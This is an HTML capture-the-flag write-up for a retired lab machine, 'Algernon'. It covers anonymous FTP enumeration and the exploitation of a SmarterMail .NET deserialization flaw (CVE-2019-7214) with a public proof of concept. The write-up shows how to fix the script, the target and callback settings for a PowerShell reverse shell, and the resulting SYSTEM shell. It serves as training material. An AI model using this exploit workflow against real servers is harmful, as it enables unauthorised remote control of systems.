@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Algernon &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Windows</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Algernon</h1>
+    <div class="meta">Target: <code>192.168.180.65</code></div>
+    <div class="tags"><span class="tag">Windows</span><span class="tag">SmarterMail</span><span class="tag">DotNetDeserialization</span><span class="tag">CVE-2019-7214</span><span class="tag">RCE</span><span class="tag">AnonymousFTP</span><span class="tag">SYSTEM</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#port-scan">Port Scan</a><a class="lvl3" href="#ftp-enumeration">FTP Enumeration</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#smartermail-net-deserialization-rce-cve-2019-7214">SmarterMail .NET Deserialization RCE (CVE-2019-7214)</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Algernon is a Windows box where anonymous FTP access reveals a SmarterMail installation, and the .NET Remoting endpoint exposed on port 17001 is vulnerable to a .NET deserialization attack (CVE-2019-7214) that executes a PowerShell reverse shell as SYSTEM, no privilege escalation step needed. The main obstacle documented in the notes is a Unicode zero-width space character embedded in the public PoC that causes a Python syntax error.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre><code class="language-sh">PORT      STATE SERVICE VERSION
+21/tcp    open  ftp     Microsoft ftpd   (anonymous login allowed)
+80/tcp    open  http    Microsoft IIS 10.0
+135/tcp   open  msrpc   Microsoft Windows RPC
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+9998/tcp  open  http    Microsoft IIS 10.0  (redirects to /interface/root)
+17001/tcp open  remoting MS .NET Remoting services
+</code></pre>
+<p>Port 17001 is the critical find: <code>.NET Remoting services</code>. Port 9998 serves the SmarterMail web interface.</p>
+<h3 id="ftp-enumeration">FTP Enumeration</h3>
+<p>Anonymous FTP gave access to four directories:</p>
+<pre><code class="language-sh">ftp anonymous@192.168.180.65
+04-29-20  10:31PM  &lt;DIR&gt;  ImapRetrieval
+07-11-22  09:08AM  &lt;DIR&gt;  Logs
+04-29-20  10:31PM  &lt;DIR&gt;  PopRetrieval
+04-29-20  10:32PM  &lt;DIR&gt;  Spool
+</code></pre>
+<p>The directory names (<code>ImapRetrieval</code>, <code>PopRetrieval</code>, <code>Spool</code>) confirm this is a SmarterMail installation. Log file review found nothing actionable, but the directory structure confirmed the application and its version context.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="smartermail-net-deserialization-rce-cve-2019-7214">SmarterMail .NET Deserialization RCE (CVE-2019-7214)</h3>
+<p>SmarterMail before build 6985 exposes a .NET Remoting endpoint that accepts serialized .NET objects without authentication. An attacker can craft a malicious serialized payload that, when deserialized by the server, executes arbitrary code.</p>
+<p>Exploit: <strong>SmarterMail Build 6985 - Remote Code Execution</strong> (EDB-49216)</p>
+<blockquote>
+<p><strong>Why .NET Remoting deserialization is exploitable:</strong> .NET Remoting is a legacy inter-process communication framework that serializes objects for transmission. If the receiving endpoint deserializes attacker-supplied data using a <code>BinaryFormatter</code> or similar, it calls object constructors and property setters during deserialization, which can be chained (via "gadget chains") to execute OS commands. The exploit encodes a PowerShell reverse shell into a base64-encoded command, stuffs it into the serialized payload, and sends it to port 17001.</p>
+</blockquote>
+<p>The public PoC (EDB-49216) embedded invisible Unicode zero-width space characters (U+200B) that caused Python to error:</p>
+<pre><code class="language-python">SyntaxError: invalid non-printable character U+200B
+</code></pre>
+<p>Fix with <code>sed</code>:</p>
+<pre><code class="language-sh">sed -i 's/\xe2\x80\x8b//g' 49216.py
+</code></pre>
+<p>After setting the target and callback details in the script:</p>
+<pre><code class="language-python">HOST='192.168.180.65'
+PORT=17001
+LHOST='192.168.45.244'
+LPORT=80
+</code></pre>
+<p>Running the exploit delivered a PowerShell reverse shell as SYSTEM:</p>
+<pre><code class="language-sh">python3 49216.py
+</code></pre>
+<p>The deserialization payload invokes <code>powershell.exe -encodedCommand &lt;base64&gt;</code>, which connects back to the listener. SmarterMail's service process runs as SYSTEM, so the shell lands with full privileges, no escalation required.</p>
+<h2 id="root">Root</h2>
+<pre><code class="language-powershell">C:\Windows\system32&gt; whoami
+nt authority\system
+</code></pre>
+<blockquote>
+<p><strong>Note:</strong> the source notes confirm SYSTEM access was achieved and the box was rooted, but the proof.txt content was not recorded in the engagement notes.</p>
+</blockquote>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong><code>.NET Remoting</code> on a non-standard port is a high-priority target.</strong> Pre-2020 builds of SmarterMail (and other products using legacy Remoting) are unauthenticated deserialization endpoints.</li>
+<li><strong>Public PoC scripts may contain hidden Unicode characters that break interpreters.</strong> When a Python script fails with <code>SyntaxError: invalid non-printable character</code>, <code>sed</code> stripping zero-width spaces (U+200B, bytes <code>\xe2\x80\x8b</code>) is the reliable fix.</li>
+<li><strong>Application service accounts frequently run as SYSTEM on Windows.</strong> A service-level RCE often means no privilege escalation is needed, the initial shell is already the highest privilege level on the box.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
